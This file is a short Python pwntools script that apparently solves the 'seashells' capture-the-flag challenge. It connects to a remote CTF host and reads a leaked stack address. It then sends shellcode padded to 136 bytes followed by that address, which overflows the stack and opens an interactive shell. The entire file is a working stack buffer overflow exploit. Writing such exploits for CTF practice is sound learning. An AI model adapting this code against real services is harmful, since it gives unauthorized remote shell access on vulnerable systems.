from pwn import *

#:
# p = process('./seashells')
p = remote('challenge.ctf.games', 30398)
#db.attach(p, 'break *main')
leak = int(p.recvuntil('\n'), 16)
print('[*] stack leak: {}'.format(hex(leak)))

context.arch = 'amd64'
exploit = asm(shellcraft.sh())
exploit += b'\x00' * (136 - len(exploit))
exploit += p64(leak)

print(p.recv())
p.sendline(exploit)
print(p.recv())
p.interactive()